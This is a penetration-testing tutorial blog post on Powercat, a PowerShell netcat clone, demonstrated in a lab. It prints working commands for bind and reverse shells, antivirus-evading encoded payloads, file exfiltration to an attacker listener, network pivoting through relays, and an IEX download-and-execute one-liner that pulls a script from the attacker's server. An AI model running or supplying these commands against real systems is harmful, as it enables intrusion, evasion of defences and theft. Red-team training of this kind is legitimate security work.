<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Powercat for Pentester</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/powercat-for-pentester/" rel="bookmark"><time class="entry-date published" datetime="2021-10-31T17:43:10+00:00">October 31, 2021</time><time class="updated" datetime="2025-05-13T08:20:38+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong data-start="259" data-end="271">Powercat</strong> is a simple <strong data-start="284" data-end="303">network utility</strong> designed to perform <strong data-start="324" data-end="359">low-level network communication</strong> operations. It implements the well-known <strong data-start="401" data-end="411">Netcat</strong> functionality in <strong data-start="429" data-end="443">Powershell</strong>. Interestingly, traditional <strong data-start="472" data-end="496">anti-virus solutions</strong> usually allow Powercat to execute without flagging it. Moreover, the utility’s installed size is just 68 KB. Its <strong data-start="610" data-end="625">portability</strong> and <strong data-start="630" data-end="655">platform independence</strong> make it an essential arrow in every red teamer’s quiver. In this article, we’ll demonstrate and learn the functionality of this tool. You can download this <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://github.com/secabstraction/PowerCat">here</a></u></strong></span>.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Basic Options in Powercat</span></strong></li>
<li><strong><span style="color: #000000;">Setting up Powercat</span></strong></li>
<li><strong><span style="color: #000000;">Port Scanning</span></strong></li>
<li><strong><span style="color: #000000;">File Transfer</span></strong></li>
<li><strong><span style="color: #000000;">Bind Shell</span></strong>
<ul>
<li><strong><span style="color: #000000;">Netcat to Powercat</span></strong></li>
<li><strong><span style="color: #000000;">Powercat to Powercat</span></strong></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Reverse Shell</span></strong>
<ul>
<li><strong><span style="color: #000000;">Netcat to Powercat</span></strong></li>
<li><strong><span style="color: #000000;">Powercat to Powercat</span></strong></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Standalone Shell</span></strong></li>
<li><strong><span style="color: #000000;">Encoded Shell</span></strong></li>
<li><strong><span style="color: #000000;">Tunnelling</span></strong></li>
<li><strong><span style="color: #000000;">Powercat One Liner</span></strong></li>
</ul>
<h3><span style="color: #800000;">Basic Options in Powercat</span></h3>
<p><span style="color: #000000;">Powercat supports various options to play around with. We’ll cover the following in this article.</span></p>
<table>
<tbody>
<tr>
<td width="48"><span style="color: #000000;">-l</span></td>
<td width="252"><span style="color: #000000;">Listen for a connection</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-c</span></td>
<td width="252"><span style="color: #000000;">Connect to a listener</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-p</span></td>
<td width="252"><span style="color: #000000;">The port to connect to, or listen on</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-e</span></td>
<td width="252"><span style="color: #000000;">Execute</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-ep</span></td>
<td width="252"><span style="color: #000000;">Execute Powershell</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-g</span></td>
<td width="252"><span style="color: #000000;">Generate Payload</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-ge</span></td>
<td width="252"><span style="color: #000000;">Generate Encoded Payload</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-d</span></td>
<td width="252"><span style="color: #000000;">Disconnect stream</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">-i</span></td>
<td width="252"><span style="color: #000000;">Input data</span></td>
</tr>
</tbody>
</table>
<h3><span style="color: #800000;">Setting up Powercat</span></h3>
<p><span style="color: #000000;">Powershell execution policy is a safety feature in Windows which determines which scripts can or cannot run on the system, therefore, we need to set the Powershell execution policy to “bypass.” This would allow all scripts to run without restriction. Thereafter, we need to download Powercat using wget.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -o powercat.ps1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg60N8Jjoidp_pda6wG37b-VvoTZBnKJg_XAq7P0YQFzMPw__s4weKUlSzpBKB9nNsxmY8-U_qXugMxJdU-fGvZFtdPUBNgh0GOF4nWMT1qYJqShSETWK5tcC33m3uKkmHRCLu4WoJ_pg4spmRJvAW8qR1qBeERuVXY7hv0Uxaa0iMlRBo5kv6GDMTHeQ=s16000"/></span></p>
<p><span style="color: #000000;">Now that we have downloaded the <strong data-start="751" data-end="770">Powercat script</strong>, we can <strong data-start="779" data-end="838">import it directly into the current Powershell terminal</strong>. After importing, we are ready to <strong data-start="873" data-end="889">use Powercat</strong> for various red teaming operations.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\powercat.ps1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4NBe3r3iDzEJxQ6R4PyKSsb2zWIzhY4HkW9oVmMMquVTyPAWe5R_5ATq-NKQ6T3AWzzw9ka2ZkXBZLtdceDe-m7j5P6iM6FFdRw3r7cBrZlxH4wdQzs8CfT561rGV-Hl5IVxz8WzDH22yoi2XCb6fSF35KkkocGoJnwhQ4TvW4SAtZCpYW65D2s_UOA=s16000"/></span></p>
<h3><span style="color: #800000;">Port Scanning</span></h3>
<p><span style="color: #000000;"><strong data-start="932" data-end="944">Powercat</strong> includes the functionality to <strong data-start="975" data-end="994">scan open ports</strong> efficiently. It does this by attempting a <strong data-start="1037" data-end="1055">TCP connection</strong> to the defined ports. For example, if we want to check for running services on ports <strong data-start="1141" data-end="1163">21, 22, 80, or 443</strong>, we can use the following method:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">(21,22,80,443) | % {powercat -c 192.168.1.150 -p $_ -t 1 -Verbose -d}</pre>
<p><span style="color: #000000;">Notably, we append the port numbers as a list variable. The <strong data-start="1259" data-end="1284">client mode (-c flag)</strong> specifies the target for scanning. As shown in the screenshot below, if a port is open, <strong data-start="1373" data-end="1419">Powercat successfully establishes a stream</strong> with the service. Additionally, the <strong data-start="1456" data-end="1482">disconnect option (-d)</strong> tells Powercat to immediately close the stream after confirming it’s open. Therefore, this technique allows us to <strong data-start="1597" data-end="1620">discover open ports</strong> effectively using Powercat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgYx79yxay1l1ugpbcvlWu3prTCYaJHwArRfR_RUdsEwOMAlzqIlr8NT4TusrcXar-itJh1f_8g_d9H2K1Xq9buWCYd4HuVwe2p9hzGUQ08k6wt2DZVJRBkLkdd_ttksTOiVxGd_M19p25_wtVSyTFx7HWimMEMl3HxTMeTgx4Al_FIafn_X_5liHsslA=s16000"/></span></p>
<h3><span style="color: #800000;">File Transfer</span></h3>
<p><span style="color: #000000;">File transfer is possible in Powercat by data input in the data stream and fetching it at the client end.</span></p>
<p><span style="color: #000000;">Let’s create a text file called “notes.txt” in the current folder. Here, input flag (-i) is used to input data in the stream. This can be used to move files, byte array object or strings too.</span></p>
<p><span style="color: #000000;">Now, we’ll first set up the listener at the client end. Let us use netcat in Linux for ease here. After setting it up, we’ll then use Powercat to transfer this text file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lnvp 443 &gt; notes.txt
powercat -c 192.168.1.3 -p 443 -i notes.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgDQmDtmkSDkxxHqsz87Y2AvWhY_3ZVqpFBN3PmqNzvpgp9DZdCU-bcAEDsM1OCcXdxUEdcSdFS9hUIlfqlopmvlUTUS2Um0wI4-Wb_bz4cFAamfhmu5v26z92z-mXYmGuoNRI5LUuV3qjv9MYW1TDjmNLdwLo5K-f09laoZJjSifoI96C-IqM1skrsBw=s16000"/></span></p>
<p class="" data-start="51" data-end="221"><span style="color: #000000;">Now, the system has transferred the contents of notes.txt to our destination. As you can see, the system successfully created the file after terminating the connection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiVBrS8gyjTxsGYvM1Vi7dwaoiM3sJVXIgIqU8r_BFcCfgMDDeEroJw0uldRI60nJ7mb4pZRoIOTSCnRQaAqvccPGjUv3sUeqe7SCkx528X0oysfq74nLE87F6V9OMHcvlDiM5BU3piKCk4QNRLBNVP7RIQEqLv9r0-7p3LVDhrSkd9Aax_uFx31xZUCw=s16000"/></span></p>
<h3><span style="color: #800000;"> Bind Shell</span></h3>
<p><span style="color: #000000;">Bind shell refers to the process where the attacker is able to connect to an open listener at the target machine and interact. To demonstrate this, we’ll set up a listener at the target using Powercat and then connect to it. There are two scenarios here:</span></p>
<ol>
<li><span style="color: #000000;">Netcat to Powercat: Here, the attacker is Kali and Windows has a listener running on it.</span></li>
</ol>
<p><span style="color: #000000;">Attacker -&gt; Kali</span></p>
<p><span style="color: #000000;">Victim -&gt; Windows</span></p>
<p class="" data-start="223" data-end="382"><span style="color: #000000;">In an ideal scenario, the attacker delivers code that executes a listener on the victim’s machine, allowing the attacker to connect and continue communication.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -l -p 443 -e cmd
nc 192.168.1.145 443</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiKwp2kgQPGGtOwnoiwsCgss147W-dczwbEmZB1YRhd6RD1HaJSCtE6GBisHbWwvIB1sH_cjJLwxCu0WTezN4nfleS3OxRkCpS85o6FXglGgzgP7zei81JMu8WLBTYvqRjTgWrkeuqMSHu7-8jin9TapOQjePFBkMjDBDpF5vI3-HfHsMZXTaB1AMbkrw=s16000"/></strong></span></p>
<p><span style="color: #000000;">And thus, we observe that the interactive session is now active on the attacker machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiD2YzEQaH6PKpKW9HkYerF9ZLxgw4-8NzeCOAONGZnr_lwuSfoDAmRpjerPy1NBjTOy9dSMSjZXopldfVwQ8O0cSNBYFQvzhAf4kwpPdwmMITQ89TETGu39oiZH53jEUC2GIDzzKT6yl7fqRABqNdLiaiaNRKVfF0uMylEV8ghmqjLdqTOszQAPybOOQ=s16000"/></span></p>
<ol>
<li><span style="color: #000000;">Powercat to Powercat: The same could be achieved between two Powercat scripts too. On the listener, we set up port 9000 and the attacker to connect and deliver the cmd executable.</span></li>
</ol>
<p><span style="color: #000000;">Listener: Ignite (Windows username)</span></p>
<p><span style="color: #000000;">Attacker: raj (Windows username)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -l -p 9000 -e cmd -v
powercat -c 192.168.1.145 -p 9000 -v</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiD5gPMEpwdDwhehNT2jQMfpacBNk3Ff0N0g-QhTbhdoemW2il1h85Dq5e_oryMTdI3jLOvJ-qG-ywci_0JiNLVrQBtmZKzZ0aCN_kp0j8-LU_0rv6GQUOKVHQP0epJdeV7bhN1uYviKjwjXqeW9K94Ue8vKjLLDOm3IC7vW8gQmKDQ5FF44ib7vAFvuA=s16000"/></strong></span></p>
<p><span style="color: #000000;">As you can see that the attacker is successfully being able to connect to the listener and spawns an interactive session. We checked the identity using whoami.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgAQKf9ENCssj5sjwi_KRXNEgaDO_sSFHMQnTttHE1Sc5yrFSc_pSu8eOmup-qvR5q-7eeH0R8TPXLT5n_hSwLQpzHJe-A4M6CzYSwU_XdAbpx7WDOV35U9u6sikLPq1HynxnwpcKSoL7t63Wc0DFF9LOCn6Etsanpe0gjNuwZ6aM4CxaSraTRjieGPIA=s16000"/></span></p>
<h3><span style="color: #800000;">Reverse Shell</span></h3>
<p><span style="color: #000000;">Reverse shell refers to the process in which the attacker machine has a listener running to which the victim connects and then the attacker executes code.</span></p>
<ol>
<li><span style="color: #000000;">Netcat to Powercat: Here, Kali (netcat) is the attacker machine with the listener running on port 443 and Windows running Powercat (victim) shall connect to it.</span></li>
</ol>
<p><span style="color: #000000;">Attacker: Netcat (Kali)</span></p>
<p><span style="color: #000000;">Victim: Ignite (Windows username)</span></p>
<p><span style="color: #000000;">This is achieved by first running netcat in listener mode on the attacker machine and then running powercat in client mode to connect.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvnp 443
powercat -c 192.168.1.3 -p 443 -e cmd.exe</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmiV_R3mhk2iHwqWn5SLE7TPfFNa_j69objHjevoQkdabvi0FpLjGXgVTJC_0jhEdbCg4bJNkRhEZSrYvlq_Cc3c22X7nMG-Uob0ceL0sO5I42TmeaVRYTlZKZ32PmCiAPJ9YQDxUpFMdglZfbIZVdjA2GixaASAoVMwoMhmvKhTWxbgjxMpdBTF0Scg=s16000"/></strong></span></p>
<p><span style="color: #000000;">As you can see, as soon as the victim enters the Powershell command, we get an interactive shell</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh3ks8MVXE69HbkyxPW5uJg9RTr9vrGlJYFktNrAz5QkjymdZos93YQifuOg5IK3yZqE5490NF43m1F7I98JoWm-9ZJvAsw-RveJckxYZRkzM15XjYnWYhJbTcCpfavxm2Jd5cPTJ3BNPECP4YrGHLMh9f125VVs0m7kyBd0VSTudbi8t02Cp-U4G4NFw=s16000"/></span></p>
<ol>
<li><span style="color: #000000;">Powercat to Powercat: The same can be done with two Windows devices too.</span></li>
</ol>
<p><span style="color: #000000;">Attacker: Ignite (Windows Username)</span></p>
<p><span style="color: #000000;">Victim: raj (Windows Username)</span></p>
<p><span style="color: #000000;">Let’s set up a listener on port 9000 first and then run powercat in client mode to connect to it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -l -p 9000 -v
powercat -c 192.168.1.145 -p 9000 -e cmd -v</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgP1nAyRZDvBGX8BYGkA-bJCsoD6xlkc6c0Wyedidz51I1KafXjGXm9LLnaZVDMBXXWB5_HjudqBlanQOD6F2moij53yaf6RtVRScxbQ2W-uHXDf-AzpS9_2vtOqbygtkTU-Ibc4k-3BtFUofrQF1z6tObx3VrZYrf3AqOBnzzlZYgkb-kBLmfjNCBH4w=s16000"/></span></p>
<p><span style="color: #000000;">As you can see, an interactive shell has been spawned by connecting to this listener.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh_PRjKc7GQsKWEnObbuUgmkB8Y9lAVxoTWO3i6-o4B5iw1qYLx8IjQ5CSS8JwErUQTn7gpEQeRdUp9Ivu2HIMFL4SD2NyafTaQTsH4O0OyNbD1dZyIv_KXBA9fVGnTUSBFXTIzajr4hZNNK_fw1coId69eB3AM4DDutqM0FtcO-QtMGfIrO5jaF8NAVA=s16000"/></span></p>
<p><span style="color: #000000;">But of course, the above Powercat command at the victim’s end is just a simulation of how gaining an interactive shell through remote code execution in real life would work.</span></p>
<h3><span style="color: #800000;">Standalone shell</span></h3>
<p><span style="color: #000000;">This option proves useful when we can execute a <strong data-start="1703" data-end="1734">script on the target system</strong>. It allows an attacker to <strong data-start="1761" data-end="1786">embed a reverse shell</strong> in a “.ps1” file and simply wait for its execution. For example, imagine a cron job is running that <strong data-start="1887" data-end="1917">executes a writable script</strong>. In that case, an attacker could <strong data-start="1951" data-end="1984">copy-paste a Powercat command</strong> to obtain a reverse shell—even if direct PowerShell execution is restricted.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -c 192.168.1.3 -p 443 -e cmd.exe -g &gt; shell.ps1
.\shell.ps1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg_5DVaG0vBQ3n53kaQVCVGOzznPNuOtBHhttcI1xBh6gAjF56jnmuFVQ5end55LlIbUoRRnSg08sZuhlfbisB4RfbUTZWHuYQpypT9-XJmkexndjgiI9V3Yr4_TRNGaf3FZeuMalPAbvqep3Eh842flmBPaIHozHgg9Cdg7g3PihEyhgAyJk2DzRG3Gw=s16000"/></span></p>
<p><span style="color: #000000;">Make sure the listener is running. We are using Kali as an attacker machine using netcat.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lnvp 443</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhBDL0OPjA4iqyXa_-n1udNmcHPArebPnJnGee7bTzXAzDDkQHOvohlTViy0iBRzGz-z6WPKlkH-O_bdYPqvCL7wJZNHucndpISkWIXvlUoGH6NLAqq6cbCj1YxJRL6ARNBv9OBtGsCAtOzhVDPly2fv1jVwfeshik0w_N5WS5PjJLAyHFWib9FojEWjQ=s16000"/></strong></span></p>
<p><span style="color: #000000;">As you can see, there are multiple ways to get an interactive shell on the target machine using netcat.</span></p>
<h3><span style="color: #800000;">Encoded Shell</span></h3>
<p><span style="color: #000000;">To evade traditional security devices like Anti-Virus solutions, we can encode the shell that we used above. Powercat has a good feature to encode a command to Hexadecimal Array. This method can bypass some basic security features. To do this, the attacker uses the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -c 192.168.1.3 -p 443 -e cmd.exe -ge &gt; encodedshell.ps1</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjaOk7Igbvs8hE2XzyTOaTHr3liCjH5pTCsd6DhdE27aerXtIOhs03YGjj6Bzg7VGhhHsXu45NCPqnT9M3Xy_fVYqBzC5h76Op8CbkVaFMZMu5ZQ_wmSEyJ-NguLGZZewzeMtcGs_L98iYBKFNPH02ZPf2DWmtuu1pOAXxjQTgCHxlmh1cW0Id3SEnooA=s16000"/></strong></span></p>
<p class="" data-start="380" data-end="472"><span style="color: #000000;">Then, they run the shell using the powershell -E option, which executes an encoded string:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -E &lt;string&gt;</pre>
<p><span style="color: #000000;">Here, &lt;string&gt; is the encoded value generated from the previous step.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgpw0rGu5lKZw24dqdMM6xNUEVaz17AUkJ_-zcsa48joF0822GQbGSYKiLltozkjBeZMdaiG2xADXzfe-TwMb6gPYYH321cNRQwvIKyI8f4fHNNpLnr08ERKumMEh8ltniRhpFY2PBaBvgLHqvOmq94ag6U5QLgDC3g6zUuPn2irdefiYi790rZZZreOw=s16000"/></span></p>
<p><span style="color: #000000;">We had set up a listener in our attacker machine (kali) beforehand and were waiting for the connection. As you can see the shell is getting executed successfully.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh-_Egjw1OmKJg4r7nwzR-qEgQ-rh-vaFOFhDvTYySUiPzi_9L0iVgM8UdA9qExdUxjH83mR7t_g_y081eLp7bDqDaJGIhpZ0XY89zmwji1F7O2qjz5YidabZ6q-LvDIj2Rbk5KV9wZDY_AnxP3EeiBDGj6Oh_4V6BiBpHZD9ZSmA-fmHnL9zjWP4ky6A=s16000"/></span></p>
<h3><span style="color: #800000;">Tunnelling</span></h3>
<p><span style="color: #000000;">Tunnelling is the most efficient mechanism of maintaining stealth while doing red team operations or even in real-life scenarios. Powershell and Powercat can help us with tunnelling and hiding our identity next time we conduct a red team assessment.</span></p>
<p><span style="color: #000000;">Here, there are three machines. Here, the Attacker communicates with a machine with two LAN cards and attacks a machine running on an alternate subnet (192.168.146.0/24)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEheOw_mVLthpu06kZUQPhM2RO7UQLQpUrPpVslcd8vKMxZyTmsI7Y5zLRDAFMQEItF0hsRgtYCcMRbBJXR9Auzna95CcRL76oyYNMK-Zd-QnBGr9GF0I61BzpmZ1VPw6LM6cXyfsX97IDIqskG03LgVvung1uMzwcMEYDNZrWETpDl7twq0RoDZaGL2wg=s16000"/></span></p>
<p><span style="color: #000000;">Now, let’s assume the attacker already has access to the tunnel machine. We’ll replicate the scenario using the Enter-PSSession command. This utility allows us to get an interactive Powershell terminal of the tunnel with the help of credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Enter-PSSession -ComputerName 192.168.1.45 -Credential raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhvb1uz1fvVm6jeRL4UmIUQgha9g4sMrQRG-8IJU1y0Lj_giANRfvBZZ71-qJfInZGGHrJUaq72kllfXAC-WC_MPHPUvQ45wlpvGXa-Zf1uh5OOsgVGtKLAgHaA9RkhkG1XgnaKWsUIfSjbUHkN4iLMOAJIvBpv6ln5Jlzq0V-O2DmVpBZ9-7NNrAfVbw=s16000"/></span></p>
<p><span style="color: #000000;">After we input the credentials, we can see that an interactive PowerShell session has been spawned.</span></p>
<p><span style="color: #000000;">We run ipconfig as a validator command however, we made an interesting observation. This machine had two LAN cards configured and there was another adapter attached. It is possible that other machines are running on this subnet.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhyPYrcZe9zhLC_u6wGBQNNSb8JVFJG_HM7x3qBceLMeO-2W2rw5Iv3CpNpkCoVOI9L7hsu5n-51zdGiFhJQnf8dol93pYY5OKssarUCLdN3_afuVxklS1-f1PTQsyrwfOZ9_5_JX3huOT6QLUMBEZ9mz2UNX0KhvIEdVpN-ug_PEG_aHsQV2_XJ5jntQ=s16000"/></span></p>
<h5><span style="color: #000000;"><strong data-start="1303" data-end="1342">Scanning and Relaying with Powercat</strong></span></h5>
<p><span style="color: #000000;">To work on our observation, we’d need Powercat in this system. We download it using wget.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -o powercat.ps1
ls</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEivhir6vNf2ZzohAqWNg_dCc1UJ8nDY6npl9ouSCoPGNdp20GMNX5mIIu_YBfKYGkViKx5Q01pcxz5A4SSLkWrSr7ZjhjRwOeNM0rV8DEh_VIrlYSWBMPkMjlqGyopeqsgbm8ONr6PMWGx0rjQTsqugKOOKpG0ZMqbaaAttHqqvkc5u3t52j8llhw2qPQ=s16000"/></strong></span></p>
<p><span style="color: #000000;">But before we can run this script, we need to change the execution policy again. Also, upon little searching, we found that 192.168.146.129 was alive and responding. Let’s scan this system using Powercat</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
Import-Module .\powercat.ps1
(21, 22, 80, 443) | % { Powercat -c 192.168.146.129 -p $_ -t 1 -Verbose -d}</pre>
<p><span style="color: #000000;">As you can see, there were three ports open: 21,22,80</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhAyHLP9hYMX591vFh7isMryGYINGFEcQUoZn4-n1D0RJygd1ONAqfQqn2Ki1M-lJ72qEGEYdDR5vldBLUnSFtYl6riljVQuJC2cZXTBhQso0YJ2EjHyk-sbLp-EF68wQplETy7fYjVGhUMmOP1cOFV_D-O0kjZpehvLUQbT2TFI0IAFbmKkbP5cidxrw=s16000"/></span></p>
<p><span style="color: #000000;">Now, if we set up a traffic relay here, our attacker system might be able to communicate and connect with SSH on the victim machine (192.168.146.129)</span></p>
<p><span style="color: #000000;">We’ll use Powercat to set up a traffic relay:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -l -p 9090 -r tcp:192.168.146.129:22 -v</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjb7s7BH0O7sfqirT5CDdEZoUIfFhdF5pTgNs9tDQXo-1eMAmmtKSLPjYbbvyR1hqFqBo11DpuEwO0TmKiFQsXTNuwfxo_BI5Rb50Ij--0mzRC3SKK6pCJHzJMgT7pbYTtEFNXP9yLO4ytg1m233fb37S93WQ-lM_Lsvu3eRIC_Xis32ctLTskBAaFMdA=s16000"/></span></p>
<p><span style="color: #000000;">As you can see above, TCP traffic from port 22 on 192.168.146.129 is now being relayed by 192.168.146.128 (tunnel) on port 9090. Thus, from an external system, we use PuTTY to connect to the tunnel machine’s 9090 port which will connect us to the victim machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEitCyxWOTewXwEcaLSqTn-JVWnYwQwJPAF1W1CHpsq5TTQJuDHOHBWV0p-8wh-C14ETtAJ5E7hH_WG7mVPRYqTRiJB2rYxP-EkKs5nrx2oJsPE8RbTGt4xBFR2D6DGRILhfZKoisMWpL5-s7iE5KfAwHAD4EWmbo9z7KYpInKlfrM90RMyi6q09rM4pVQ=s16000"/></span></p>
<p><span style="color: #000000;">And just like that, we now have completed our tunnel and accessed our victim machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhLp08ayMe3zNiy-xSNWowAtIOFQJ8YZw93QExdXBaB7jhA77xxcdhCK3lpwGJr_jVT25XSL9m7aJWqlcBO4KbFMPhFAAnioRwBW7ozcf3HqaTpTZkOVuM-0VTB8myxz1cRyeVOfD20hPV37xvDSV1z_GjcQjH1mrhgte03LneED7eNBsxHLSF5C-C-Bw=s16000"/></span></p>
<p><span style="color: #000000;">We can use Powercat to setup relay on port 80 too through which we’ll be able to access the website running on victim.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powercat -l -p 9090 -r tcp:192.168.146.129:80 -v</pre>
<p><span style="color: #000000;">As evident, the victim is now accessible through this tunnel.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhEp_ab-zAEHqG1MNaiSud8Zk_1SOLI35MxVSWft-bzHsbga6YCr5CU9Fx1KZIjincpUVEscA-zh0Naggfv-0SZTUuJSuxBKA6hRpjNVMjQGy6tG7oI9VIpobAWsAV7cWzDdtxNV7QihoJrAbBIAJzteEgHf8hu48z7jdVyGwG14UO6m1FDTQD27dCBxw=s16000"/></span></p>
<h3><span style="color: #800000;">Powercat One Liner</span></h3>
<p><span style="color: #000000;">Powercat’s reverse shell exists as a one-liner command too. Assume that we have code execution on the victim, we can use Powercat’s one-liner to get a reverse shell back on the listener running on the attacker’s machine. For this process, we need to download Powercat in a separate folder and run a web server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -o powercat.ps1
python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhfmVPeGN3SRZgGWGljnuunwKLZKYDu70VXe3IcXWL5m3vQeswS0CuwKR8tcp4lLA-I9nhhn930TIhbV5DgMVgGW3qCN9BTRdy4lmwfLCxhq-F82lt6JxPAHdOQ5AC6b5ybC4OaL1sYFg_jvM6Ll7n79Sjcx7O7iNdUwrcx_kzZRU8PnGcf0Ti5AyDNOA=s16000"/></strong></span></p>
<p><span style="color: #000000;">Now, we’ll set up a listener on port 4444 in the attacker (kali) machine immediately. Meanwhile, we have code execution on the target and thus, we’ll use the following Powershell/Powercat one liner:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.3/powercat.ps1');powercat -c 192.168.1.3 -p 4444 -e cmd"</pre>
